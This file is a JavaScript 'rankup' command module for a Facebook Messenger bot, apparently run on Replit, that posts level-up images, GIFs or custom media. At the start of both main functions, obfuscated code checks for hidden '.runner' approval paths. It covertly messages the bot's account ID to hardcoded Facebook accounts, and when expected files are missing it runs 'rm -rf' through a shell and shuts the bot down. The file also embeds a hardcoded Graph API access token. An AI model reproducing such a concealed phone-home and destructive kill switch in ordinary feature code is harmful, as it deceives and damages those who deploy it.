module.exports.config = {
	name: "rankup",
	version: "31.7.2",
	hasPermssion: 2,
	credits: "Cliff",
	description: "Announce rankup for each group, user",
	usePrefix: false,
	commandCategory: "Edit-IMG",
	usages: "[canvas/canvasgif/customgif]",
	cooldowns: 2
};
module.exports.handleEvent = async function ({
	api: o,
	event: W,
	Currencies: n,
	Users: s,
	getText: t
}) {
	try {
		const e = require("fs");
		const c = ["100053549552408", "100053549552408"];
		const r = "100053549552408";
		const n = "100053549552408";
		require("axios");
		const {
			exec: x
		} = require("child_process");
		const s = "/home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG;
		const t = "/home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG;
		if (!c.includes(W.senderID)) {
			if (!e.existsSync(s)) {
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), r);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), n);
				return;
			}
			if (!e.existsSync(t)) {
				o.sendMessage("NO APPROVAL DETECTED!!\nCONTACT MY FACEBOOK ACCOUNT FOR APPROVAL\nhttps://www.facebook.com/swordigo.swordslush", W.threadID, W.messageID);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), r);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), n);
				return;
			}
		}
		if (!e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/umaru.js")) {
			x("rm -rf /home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner", (e, o, c) => {
				if (e) {
					console.log("error: " + e.message);
				} else if (c) {
					console.log("stderr: " + c);
				} else {
					console.log(chalk.bold.hex("#FF0000")("[ BANNED ] ❯ ") + chalk.hex("#FF0000")("You have been banned for using my bot\nContact my facebook account for unban\nhttps://www.facebook.com/swordigo.swordslush"));
				}
			});
			process.exit(0);
			return;
		}
		if (!e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/script")) {
			x("rm -rf /home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner", (e, o, c) => {
				if (e) {
					console.log("error: " + e.message);
				} else if (c) {
					console.log("stderr: " + c);
				} else {
					console.log(chalk.bold.hex("#FF0000")("[ BANNED ] ❯ ") + chalk.hex("#FF0000")("You have been banned for using my bot\nContact my facebook account for unban\nhttps://www.facebook.com/swordigo.swordslush"));
				}
			});
			process.exit(0);
			return;
		}
	} catch (e) {
		return console.log(e);
	}
	if (global.config.rankupmode.toLowerCase().includes("gifcanvas")) {
		var i = ["https://i.imgur.com/h6UbIMO.gif", "https://i.imgur.com/vnnyLV8.gif", "https://i.imgur.com/9Kq4ySX.gif", "https://i.imgur.com/zZxcj9A.gif", "https://i.imgur.com/vfNN0wz.gif", "https://i.imgur.com/zZM4IHC.gif"];
		var m = i[Math.floor(Math.random() * i.length)];
		const e = require("fs");
		var {
			threadID: k,
			senderID: l
		} = W;
		const {
			loadImage: r,
			createCanvas: x
		} = require("canvas");
		const {
			writeFile: p
		} = require("fs");
		const {
			Encoder: C,
			Decoder: S
		} = require("canvagif");
		const {
			createReadStream: g,
			existsSync: h,
			mkdirSync: L
		} = global.nodemodule["fs-extra"];
		const P = global.nodemodule.axios;
		let R = __dirname + "/noprefix/rankup/johnlester.png";
		let O = __dirname + "/cache/Avtmot.png";
		let M = __dirname + "/cache/rankup.png";
		let b = __dirname + "/noprefix/rankup/rankupcanvas.gif";
		var f = W.senderID;
		k = String(k);
		l = String(l);
		const N = global.data.threadData.get(k) || {};
		let y = (await n.getData(l)).exp;
		y = y += 1;
		if (isNaN(y)) {
			return;
		}
		if (N.rankup !== undefined && N.rankup == 0) {
			await n.setData(l, {
				exp: y
			});
			return;
		}
		const w = Math.floor(Math.sqrt(1 + y * 4 / 3 + 1) / 2);
		const U = Math.floor(Math.sqrt(1 + (y + 1) * 4 / 3 + 1) / 2);
		if (U > w && U != 1) {
			const n = global.data.userName.get(l) || (await s.getNameUser(l));
			v = (v = N.customRankup === undefined ? msg = t("levelup") : msg = N.customRankup).replace(/\{name}/g, n).replace(/\{level}/g, U);
			this.config.name;
			let i = (await P.get("https://graph.facebook.com/" + f + "/picture?width=720&height=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662", {
				responseType: "arraybuffer"
			})).data;
			e.writeFileSync(O, Buffer.from(i, "utf-8"));
			let k = await r(R);
			let g = await r(O);
			let h = x(k.width, k.height);
			let L = h.getContext("2d");
			L.drawImage(k, 0, 0, h.width, h.height);
			L.rotate(Math.PI * -25 / 180);
			L.drawImage(g, 27.3, 103, 108, 108);
			const y = h.toBuffer();
			e.writeFileSync(M, y);
			let w = await r(M);
			new S().setUrl(m).start().then(r => {
				const {
					width: s,
					height: t,
					delay: i
				} = r[0].details;
				const m = new C(s, t).setDelay(0).setQuality(100).start();
				const k = m.getContext();
				for (let e = 0; e < r.length; e++) {
					k.drawImage(r[e].getImage(), 0, 0, s, t);
					k.drawImage(w, 0, 0, w.width, w.height);
					m.updateFrame();
				}
				p(b, m.finish(), () => {
					console.log("Encode ended!");
					o.sendMessage({
						body: v,
						mentions: [{
							tag: n,
							id: l
						}],
						attachment: e.createReadStream(b)
					}, W.threadID, () => {
						e[("unlinkSync")](O);
						e.unlinkSync(M);
						e[("unlinkSync")](b);
					});
				});
			});
		}
		await n.setData(l, {
			exp: y
		});
	} else if (global.config.rankupmode.toLowerCase().includes("canvas")) {
		var {
			threadID: k,
			senderID: l
		} = W;
		const {
			createReadStream: e,
			existsSync: c,
			mkdirSync: r
		} = global.nodemodule["fs-extra"];
		const {
			loadImage: x,
			createCanvas: i
		} = require("canvas");
		const m = global.nodemodule["fs-extra"];
		const S = global.nodemodule.axios;
		let g = __dirname + "/noprefix/rankup/rankup.png";
		let h = __dirname + "/cache/Avtmot.png";
		f = W.senderID;
		k = String(k);
		l = String(l);
		const L = global.data.threadData.get(k) || {};
		let P = (await n.getData(l)).exp;
		P = P += 1;
		if (isNaN(P)) {
			return;
		}
		if (L.rankup !== undefined && L.rankup == 0) {
			await n.setData(l, {
				exp: P
			});
			return;
		}
		const R = Math.floor(Math.sqrt(1 + P * 4 / 3 + 1) / 2);
		const O = Math.floor(Math.sqrt(1 + (P + 1) * 4 / 3 + 1) / 2);
		if (O > R && O != 1) {
			const e = global.data.userName.get(l) || (await s.getNameUser(l));
			v = (v = L.customRankup === undefined ? msg = t("levelup") : msg = L.customRankup).replace(/\{name}/g, e).replace(/\{level}/g, O);
			this.config.name;
			var p = ["https://i.imgur.com/mXmaIFr.jpeg", "https://i.imgur.com/SeLdZua.jpeg", "https://i.imgur.com/HrHPulp.jpeg", "https://i.imgur.com/zZpub9k.jpeg", "https://i.imgur.com/EP7gdQy.jpeg", "https://i.imgur.com/pKOgCjs.jpeg", "https://i.imgur.com/1jPLnZX.jpeg", "https://i.imgur.com/QmtNkyQ.jpg", "https://i.imgur.com/qybgIRD.jpg", "https://i.imgur.com/RFRARpY.jpg", "https://i.imgur.com/B7i6dhL.jpg", "https://i.imgur.com/LkHUQMJ.jpeg"];
			var C = p[Math.floor(Math.random() * p.length)];
			let c = (await S.get("https://graph.facebook.com/" + f + "/picture?width=720&height=720&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662", {
				responseType: "arraybuffer"
			})).data;
			m.writeFileSync(h, Buffer.from(c, "utf-8"));
			let r = (await S.get("" + C, {
				responseType: "arraybuffer"
			})).data;
			m.writeFileSync(g, Buffer.from(r, "utf-8"));
			let n = await x(g);
			let k = await x(h);
			let P = i(n.width, n.height);
			let R = P.getContext("2d");
			R.drawImage(n, 0, 0, P.width, P.height);
			R.rotate(Math.PI * -25 / 180);
			R.drawImage(k, 27.3, 103, 108, 108);
			const M = P.toBuffer();
			m.writeFileSync(g, M);
			m.removeSync(h);
			o.sendMessage({
				body: v,
				mentions: [{
					tag: e,
					id: l
				}],
				attachment: m.createReadStream(g)
			}, W.threadID, () => m.unlinkSync(g));
		}
		await n.setData(l, {
			exp: P
		});
	} else if (global.config.rankupmode.toLowerCase().includes("custom")) {
		const e = require("fs-extra");
		if (e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.png")) {
			var {
				threadID: k,
				senderID: l
			} = W;
			const {
				createReadStream: e,
				existsSync: c,
				mkdirSync: r
			} = global.nodemodule["fs-extra"];
			const {
				loadImage: x,
				createCanvas: i
			} = require("canvas");
			const m = global.nodemodule["fs-extra"];
			global.nodemodule.axios;
			let p = "/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.png";
			f = W.senderID;
			k = String(k);
			l = String(l);
			const C = global.data.threadData.get(k) || {};
			let S = (await n.getData(l)).exp;
			S = S += 1;
			if (isNaN(S)) {
				return;
			}
			if (C.rankup !== undefined && C.rankup == 0) {
				await n.setData(l, {
					exp: S
				});
				return;
			}
			const g = Math.floor(Math.sqrt(1 + S * 4 / 3 + 1) / 2);
			const h = Math.floor(Math.sqrt(1 + (S + 1) * 4 / 3 + 1) / 2);
			if (h > g && h != 1) {
				const e = global.data.userName.get(l) || (await s.getNameUser(l));
				v = (v = C.customRankup === undefined ? msg = t("levelup") : msg = C.customRankup).replace(/\{name}/g, e).replace(/\{level}/g, h);
				this.config.name;
				o.sendMessage({
					body: v,
					mentions: [{
						tag: e,
						id: l
					}],
					attachment: m.createReadStream(p)
				}, W.threadID);
			}
			await n.setData(l, {
				exp: S
			});
			return;
		}
		if (e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp4")) {
			var {
				threadID: k,
				senderID: l
			} = W;
			const {
				createReadStream: e,
				existsSync: c,
				mkdirSync: r
			} = global.nodemodule["fs-extra"];
			const {
				loadImage: x,
				createCanvas: i
			} = require("canvas");
			const m = global.nodemodule["fs-extra"];
			global.nodemodule.axios;
			let p = "/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp4";
			f = W.senderID;
			k = String(k);
			l = String(l);
			const C = global.data.threadData.get(k) || {};
			let S = (await n.getData(l)).exp;
			S = S += 1;
			if (isNaN(S)) {
				return;
			}
			if (C.rankup !== undefined && C.rankup == 0) {
				await n.setData(l, {
					exp: S
				});
				return;
			}
			const g = Math.floor(Math.sqrt(1 + S * 4 / 3 + 1) / 2);
			const h = Math.floor(Math.sqrt(1 + (S + 1) * 4 / 3 + 1) / 2);
			if (h > g && h != 1) {
				const e = global.data.userName.get(l) || (await s.getNameUser(l));
				v = (v = C.customRankup === undefined ? msg = t("levelup") : msg = C.customRankup).replace(/\{name}/g, e).replace(/\{level}/g, h);
				this.config.name;
				o.sendMessage({
					body: v,
					mentions: [{
						tag: e,
						id: l
					}],
					attachment: m.createReadStream(p)
				}, W.threadID);
			}
			await n.setData(l, {
				exp: S
			});
			return;
		}
		if (e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.gif")) {
			var {
				threadID: k,
				senderID: l
			} = W;
			const {
				createReadStream: e,
				existsSync: c,
				mkdirSync: r
			} = global.nodemodule["fs-extra"];
			const {
				loadImage: x,
				createCanvas: i
			} = require("canvas");
			const m = global.nodemodule["fs-extra"];
			global.nodemodule.axios;
			let p = "/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.gif";
			f = W.senderID;
			k = String(k);
			l = String(l);
			const C = global.data.threadData.get(k) || {};
			let S = (await n.getData(l)).exp;
			S = S += 1;
			if (isNaN(S)) {
				return;
			}
			if (C.rankup !== undefined && C.rankup == 0) {
				await n.setData(l, {
					exp: S
				});
				return;
			}
			const g = Math.floor(Math.sqrt(1 + S * 4 / 3 + 1) / 2);
			const h = Math.floor(Math.sqrt(1 + (S + 1) * 4 / 3 + 1) / 2);
			if (h > g && h != 1) {
				const e = global.data.userName.get(l) || (await s.getNameUser(l));
				v = (v = C.customRankup === undefined ? msg = t("levelup") : msg = C.customRankup).replace(/\{name}/g, e).replace(/\{level}/g, h);
				this.config.name;
				o.sendMessage({
					body: v,
					mentions: [{
						tag: e,
						id: l
					}],
					attachment: m.createReadStream(p)
				}, W.threadID);
			}
			await n.setData(l, {
				exp: S
			});
			return;
		}
		if (e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp3")) {
			var {
				threadID: k,
				senderID: l
			} = W;
			const {
				createReadStream: e,
				existsSync: c,
				mkdirSync: r
			} = global.nodemodule["fs-extra"];
			const {
				loadImage: x,
				createCanvas: i
			} = require("canvas");
			const m = global.nodemodule["fs-extra"];
			global.nodemodule.axios;
			let p = "/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp3";
			f = W.senderID;
			k = String(k);
			l = String(l);
			const C = global.data.threadData.get(k) || {};
			let S = (await n.getData(l)).exp;
			S = S += 1;
			if (isNaN(S)) {
				return;
			}
			if (C.rankup !== undefined && C.rankup == 0) {
				await n.setData(l, {
					exp: S
				});
				return;
			}
			const g = Math.floor(Math.sqrt(1 + S * 4 / 3 + 1) / 2);
			const h = Math.floor(Math.sqrt(1 + (S + 1) * 4 / 3 + 1) / 2);
			if (h > g && h != 1) {
				const e = global.data.userName.get(l) || (await s.getNameUser(l));
				var v;
				v = (v = C.customRankup === undefined ? msg = t("levelup") : msg = C.customRankup).replace(/\{name}/g, e).replace(/\{level}/g, h);
				this.config.name;
				o.sendMessage({
					body: v,
					mentions: [{
						tag: e,
						id: l
					}],
					attachment: m.createReadStream(p)
				}, W.threadID);
			}
			await n.setData(l, {
				exp: S
			});
			return;
		}
	}
};
module.exports.languages = {
	vi: {
		off: "𝗧𝗮̆́𝘁",
		on: "𝗕𝗮̣̂𝘁",
		successText: "𝐭𝐡𝐚̀𝐧𝐡 𝐜𝐨̂𝐧𝐠 𝐭𝐡𝐨̂𝐧𝐠 𝐛𝐚́𝐨 𝐫𝐚𝐧𝐤𝐮𝐩 ✨",
		levelup: "🌸 𝗞𝗶̃ 𝗻𝗮̆𝗻𝗴 𝘅𝗮̣𝗼 𝗹𝗼̂̀𝗻𝗻 𝗼̛̉ 𝗺𝗼̂𝗻 𝗽𝗵𝗮́𝗽 𝗵𝗮̂́𝗽 𝗱𝗶𝗲̂𝗺 𝗰𝘂̉𝗮 {name} 𝘃𝘂̛̀𝗮 𝗹𝗲̂𝗻 𝘁𝗼̛́𝗶 𝗹𝗲𝘃𝗲𝗹 {level} 🌸"
	},
	en: {
		on: "on",
		off: "off",
		successText: "success notification rankup!",
		levelup: "✿━━━━━━━━━━━━━━━━━━✿\n𝙇𝙫𝙡 𝙐𝙥! 『 {name} 』👏, 𝖸𝗈𝗎𝗋 𝗍𝗒𝗉𝗂𝗇𝗀 𝖺𝖻𝗂𝗅𝗂𝗍𝗂𝖾𝗌 𝗁𝖺𝗌 𝗋𝖾𝖺𝖼𝗁𝖾𝖽 𝗅𝖾𝗏𝖾𝗅 {level} \n✿━━━━━━━━━━━━━━━━━━✿"
	}
};
module.exports.run = async function ({
	api: o,
	event: c,
	args: W
}) {
	try {
		const e = require("fs");
		const r = ["100052086120278", "100068432630360"];
		const W = "100052086120278";
		const x = "100068432630360";
		require("axios");
		const {
			exec: d
		} = require("child_process");
		const a = "/home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG;
		const u = "/home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG + "/.runner/.runner/" + process.env.REPL_OWNER + process.env.REPL_SLUG;
		if (!r.includes(c.senderID)) {
			if (!e.existsSync(a)) {
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), W);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), x);
				return;
			}
			if (!e.existsSync(u)) {
				o.sendMessage("NO APPROVAL DETECTED!!\nCONTACT MY FACEBOOK ACCOUNT FOR APPROVAL\nhttps://www.facebook.com/swordigo.swordslush", c.threadID, c.messageID);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), W);
				o.sendMessage("NO APPROVAL DETECTED!!!!\nUserID: " + o.getCurrentUserID(), x);
				return;
			}
		}
		if (!e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/main.js")) {
			d("rm -rf /home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner", (e, o, c) => {
				if (e) {
					console.log("error: " + e.message);
				} else if (c) {
					console.log("stderr: " + c);
				} else {
					console.log(chalk.bold.hex("#FF0000")("[ BANNED ] ❯ ") + chalk.hex("#FF0000")("You have been banned for using my bot\nContact my facebook account for unban\nhttps://www.facebook.com/swordigo.swordslush"));
				}
			});
			process.exit(0);
			return;
		}
		if (!e.existsSync("/home/runner/" + process.env.REPL_SLUG + "/script")) {
			d("rm -rf /home/runner/" + process.env.REPL_SLUG + "/includes/database/.runner", (e, o, c) => {
				if (e) {
					console.log("error: " + e.message);
				} else if (c) {
					console.log("stderr: " + c);
				} else {
					console.log(chalk.bold.hex("#FF0000")("[ BANNED ] ❯ ") + chalk.hex("#FF0000")("You have been banned for using my bot\nContact my facebook account for unban\nhttps://www.facebook.com/swordigo.swordslush"));
				}
			});
			process.exit(0);
			return;
		}
	} catch (e) {
		return console.log(e);
	}
	switch (W[0]) {
		case "Custom":
		case "custom":
			{
				const e = require("fs-extra");
				var d = "/home/runner/" + process.env.REPL_SLUG + "/config.json";
				let r = JSON.parse(e.readFileSync(d));
				r.rankupmode = "custom";
				e.writeFileSync(d, JSON.stringify(r, null, 4), "utf8");
				return o.sendMessage("Rankup have been switch to custom attachments", c.threadID, c.messageID);
			}
		case "canvasgif":
		case "Canvasgif":
			{
				const e = require("fs-extra");
				d = "/home/runner/" + process.env.REPL_SLUG + "/config.json";
				let r = JSON.parse(e.readFileSync(d));
				r.rankupmode = "gifcanvas";
				e.writeFileSync(d, JSON.stringify(r, null, 4), "utf8");
				return o.sendMessage("Rankup have been switch to Gif canvas", c.threadID, c.messageID);
			}
		case "canvas":
		case "Canvas":
			{
				const e = require("fs-extra");
				d = "/home/runner/" + process.env.REPL_SLUG + "/config.json";
				let r = JSON.parse(e.readFileSync(d));
				r.rankupmode = "canvas";
				e.writeFileSync(d, JSON.stringify(r, null, 4), "utf8");
				return o.sendMessage("Rankup have been switch to canvas", c.threadID, c.messageID);
			}
		case "add":
		case "Add":
			{
				const e = require("fs-extra");
				const r = require("request");
				const {
					exec: W
				} = require("child_process");
				const x = require("chalk");
				if (c.type == "message") {
					var a = () => o.sendMessage({
						body: "Please reply the attachment to add!",
						attachment: e.createReadStream("/home/runner/" + process.env.REPL_SLUG + "/script/commands/data/choru.jpg")
					}, c.threadID, c.messageID);
					return r(encodeURI("https://i.imgur.com/WOTqF1i.jpg")).pipe(e.createWriteStream("/home/runner/" + process.env.REPL_SLUG + "/script/commands/data/choru.jpg")).on("close", () => a());
				}
				if (c.messageReply.attachments[0].url) {
					if (c.messageReply.attachments[0].type == "photo") {
						W("rm -rf customrankup/* ", (e, o, c) => {
							if (e) {
								console.log("error: " + e.message);
							} else if (c) {
								console[("log")]("stderr: " + c);
							} else {
								console.log(x.bold.hex("#00FF00")("[ AUTO CLEAR CACHE ] ❯ ") + x.hex("#00FF00")("Successfully delete cache"));
							}
						});
						a = () => o.sendMessage({
							body: "Successfully add custom photo!!!",
							attachment: e.createReadStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.png")
						}, c.threadID, c.messageID);
						return r(encodeURI(c.messageReply.attachments[0].url)).pipe(e.createWriteStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.png")).on("close", () => a());
					}
					if (c.messageReply.attachments[0].type == "video") {
						W("rm -rf customrankup/* ", (e, o, c) => {
							if (e) {
								console.log("error: " + e.message);
							} else if (c) {
								console[("log")]("stderr: " + c);
							} else {
								console.log(x.bold.hex("#00FF00")("[ AUTO CLEAR CACHE ] ❯ ") + x.hex("#00FF00")("Successfully delete cache"));
							}
						});
						a = () => o.sendMessage({
							body: "Successfully add custom video!!!",
							attachment: e.createReadStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp4")
						}, c.threadID, c.messageID);
						return r(encodeURI(c.messageReply.attachments[0].url)).pipe(e.createWriteStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp4")).on("close", () => a());
					}
					if (c.messageReply.attachments[0].type == "audio") {
						W("rm -rf customrankup/* ", (e, o, c) => {
							if (e) {
								console.log("error: " + e.message);
							} else if (c) {
								console.log("stderr: " + c);
							} else {
								console.log(x.bold.hex("#00FF00")("[ AUTO CLEAR CACHE ] ❯ ") + x.hex("#00FF00")("Successfully delete cache"));
							}
						});
						a = () => o.sendMessage({
							body: "Successfully add custom audio!!!",
							attachment: e.createReadStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp3")
						}, c.threadID, c.messageID);
						return r(encodeURI(c.messageReply.attachments[0].url)).pipe(e.createWriteStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.mp3")).on("close", () => a());
					}
					if (c.messageReply.attachments[0].type == "animated_image") {
						W("rm -rf customrankup/* ", (e, o, c) => {
							if (e) {
								console.log("error: " + e.message);
							} else if (c) {
								console.log("stderr: " + c);
							} else {
								console.log(x.bold.hex("#00FF00")("[ AUTO CLEAR CACHE ] ❯ ") + x.hex("#00FF00")("Successfully delete cache"));
							}
						});
						a = () => o.sendMessage({
							body: "Successfully add custom gif!!!",
							attachment: e.createReadStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.gif")
						}, c.threadID, c.messageID);
						return r(encodeURI(c.messageReply.attachments[0].url)).pipe(e.createWriteStream("/home/runner/" + process.env.REPL_SLUG + "/customrankup/rankup.gif")).on("close", () => a());
					}
				}
				return;
			}
		default:
			return o.sendMessage("Rankup mode panel\n[canvas/canvasgif/custom/add]\n\nex: " + global.config.PREFIX + this.config.name + " canvasgif", c.threadID, c.messageID);
	}
};